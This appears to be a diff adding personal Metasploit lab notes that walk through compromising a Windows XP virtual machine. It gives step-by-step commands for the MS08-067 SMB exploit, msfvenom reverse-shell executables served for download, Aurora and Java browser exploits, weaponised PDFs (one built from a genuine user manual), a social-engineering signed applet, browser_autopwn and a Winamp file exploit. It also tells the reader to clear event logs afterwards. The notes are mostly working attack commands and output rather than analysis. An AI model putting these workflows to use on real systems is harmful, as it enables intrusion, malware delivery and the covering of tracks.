@@ -1,0 +1,264 @@
+
+---------------------------------------------------
+ E X P L O I T  +  P A Y L O A D  (M A N U A L L Y)| 
+---------------------------------------------------
+
+Taking windowsXP vm as main target, we look for smb vulnerabilities to exploit, in this case we go to msfconsole and search for windows/smb/ms08_067:
+
+	#: msf5 > search windows/smb/ms08_067
+
+	Matching Modules
+	================
+
+	   #  Name                                 Disclosure Date  Rank   Check  Description
+	   -  ----                                 ---------------  ----   -----  -----------
+	   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+
+
+Then we need to set the options and the target machine address, once we've done this, we need to check for compatible payloads to run once we've exploited our machine, in this case we're gonna use shell/reverse_tcp so we set it on our msf exploit :
+
+	#: msf5 exploit(windows/smb/ms08_067_netapi) > show payloads
+
+	...
+	16  payload/windows/shell/reverse_tcp                            normal  No     Windows Command Shell, Reverse TCP Stager
+	..
+
+   
+	#: msf5 exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_tcp
+	   payload => windows/shell/reverse_tcp
+
+
+Once we've set our exploit and selected our payload, its time to select our target and local machine and to specify the ports, then is just time to exploit and gain access to the machine.
+
+
+
+
+# BIND SHELLS: Instructs the target machine to open a command shell and listen on a local port. (Not reliable since Firewall updates)
+# REVERSE SHELLS: Pushes a connection back to the attack machine rather than waiting for an incoming connection, (we open a local port and listen)
+
+
+
+-------------------
+ M S F   V E N O M |
+-------------------
+
+To display the payload list -> msfvenom -l payloads
+
+In this case we'll use Meterpreter payload, (windows/meterpreter/reverse_tcp)
+
+	#: msfvenom -p windows/meterpreter/reverse_tcp --list-options
+	#: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=12345 -f exe > example4.exe
+	#: file example4.exe
+
+It's time to upload it on our apache2 server and download it on the target machine, once we've done this we just need to use the multi handler module to wait for incomming connections:
+
+	#: msfconsole
+	#: use multi/handler
+	#: set payload windows/meterpreter/reverse_tcp
+
+Set the options and run the exploit, wait the meterpreter to open the session and done!
+
+
+-----------------------
+ M E T E R P R E T E R |
+-----------------------
+
+The main difference about the meterpreter and shell, is that the meterpreter offers more options on the shell to exploit on the target machine (clear regs, use linux commands...)
+
+To use it and exploit the target machine is as easy as the first step:
+
+	msf5#: msfconsole
+	msf5#: use windows/smb/ms08_067_netapi
+	msf5 exploit(windows/smb/ms08_067_netapi)#: > set payload windows/meterpreter/reverse_tcp
+	msf5#: options
+	msf5#: exploit
+
+Wait for the session to open and Voilà, you've runned the meterpreter on the target machine.
+(pssh don't forget to clear your logs after exploiting your target machine!! -> clearev)
+
+
+-----------------------
+ A U R O R A   V U L N |
+-----------------------
+
+Goal: Gain access to winXP via local server trough aurora on windowsXP internet explorer:
+(*) Apache2 needs to be stopped, local port must be 80, SRVHOST is our local machine ip, URIPATH aurora, and LHOST local ip
+
+	msf5#: msfconsole
+	msf5#: use exploit/windows/browser/ms10_002_aurora
+	msf5 exploit(exploit/windows/browser/ms10_002_aurora)#: > set payload windows/meterpreter/reverse_tcp
+	msf5#: options
+	msf5#: exploit
+
+
+Setting migrate script on payload to avoid crash during the exploit once the victim disconnects:
+
+	
+	msf5 exploit(windows/browser/ms10_002_aurora)#: set AutoRunScript migrate -f
+	msf5 exploit(windows/browser/ms10_002_aurora)#:  > advanced
+
+	...
+	AutoRunScript                migrate -f             no        A script to run automatically on session creation.
+	...
+
+
+Notepad Trick:
+
+open a shell on the meterpreter and upload a file, then type:
+
+	C:\WINDOWS>NOTEPAD /p "C:\WINDOWS\test.txt"
+	NOTEPAD /p "C:\WINDOWS\test.txt"
+
+
+
+-------------------
+ A D O B E  P D F  |
+-------------------
+
+Creates a malicious PDF, hosting it for delivery and we need to set up a payload.
+
+	msf5 > use exploit/windows/fileformat/adobe_utilprintf
+	msf5 exploit(windows/fileformat/adobe_utilprintf) > set FILENAME Beca.pdf
+	exploit -> Beca.pdf stored at /root/.msf4/local/Beca.pdf
+	#: cp /root/.msf4/local/Beca.pdf /var/www/html/
+
+
+Now its time to create a the multi/handler to bind the connection with the pdf
+ 
+	msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+
+
+Once we've all, we just need the victim to open the server with the current url and execute the downloaded file
+
+If we want to listen to multiple connections instead of just listening and open the first one, we need to set ExitOnSession false, once the listener starts on the background it will be stuck indefinitely, so we need to use -j options to run the handler as a job in the background so we can continue using msfconsole, and to close it we can use kill <job number>
+
+
+Another malicious PDF is exploit/windows/fileformat/adobe_pdf_embedded_exe, which can be used and executed when te victim gives permission to run the embedded file:
+
+	msf5 > use exploit/windows/fileformat/adobe_pdf_embedded_exe
+	msf5 > set FILENAME test.pdf
+	msf5 > set INFILENAME /usr/share/set/readme/User_Manual.pdf
+	msf5 > set payload windows/meterpreter/reverse_tcp
+	msf5 > set LHOST 192.168.1.113
+
+
+
+------------------
+ J A V A  V U L N |
+------------------
+
+Similar as the previous oe with Internet Explorer Aurora exploit:
+
+Goal: Gain access to winXP via local server trough aurora on windowsXP internet explorer:
+(*) Apache2 needs to be stopped, local port must be 80, SRVHOST is our local machine ip, URIPATH javaexploit, and LHOST local ip
+
+
+	msf#: exploit/multi/browser/java_jre17_jmxbean
+	msf#: set ...
+	msf#: show payloads
+	msf#: set payload java/meterpreter/reverse_http
+	msf#: show options
+	msf#: set ...
+	
+
+(*) Needs to be installed java plugins
+
+[Signed Java Applet]
+
+More like the attack against PDF with PDF Embedded Executable we can bypass the need for unpatched Java vulnerability with just clicking "Yes", convincing the victim what we are doing is useful.
+
+
+
+	msf#: exploit/multi/browser/java_signed_applet
+	msf#: set ...
+	msf#: set APPLETNAME BulbSec
+	msf#: show targets
+	msf#: set target 0 (Generic)
+	msf#: show payloads
+	msf#: set payload java/meterpreter/reverse_tcp
+	msf#: show options
+	msf#: set ...
+
+
+---------------
+ A U T O P W N |
+--------------- 
+
+
+Considered as cheating, loads all the browser and browser add-on modules that it knows and waits for a browser to connect to the server.
+
+
+
+	msf#: use auxiliary/server/browser_autopwn
+	msf#: set ...
+	msf#: set URIPATH autopwn
+	msf#: exploit
+
+	[*] Local IP: http://192.168.1.113:8080/xprcOaMNSLJ
+	[*] Server started.
+	[*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp
+	[*] Using URL: http://0.0.0.0:8080/hiOsCcLvzpmnN
+	[*] Local IP: http://192.168.1.113:8080/hiOsCcLvzpmnN
+	[*] Server started.
+	[*] Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp
+	[*] Using URL: http://0.0.0.0:8080/kTEwPaffcWQ
+	[*] Local IP: http://192.168.1.113:8080/kTEwPaffcWQ
+	[*] Server started.
+	[*] Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp
+	[*] Using URL: http://0.0.0.0:8080/vwOVQnNLJwpiW
+	[*] Local IP: http://192.168.1.113:8080/vwOVQnNLJwpiW
+	
+	...
+		
+
+-------------
+ W I N A M P |
+-------------
+
+Replace a configuration file for the Winmap music player program, whenever the user opens the program, the evil configuration file will be processed.
+
+	msf#: use exploit/windows/fileformat/winamp_maki_bof
+	msf#: set payload windows/meterpreter/reverse_tcp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
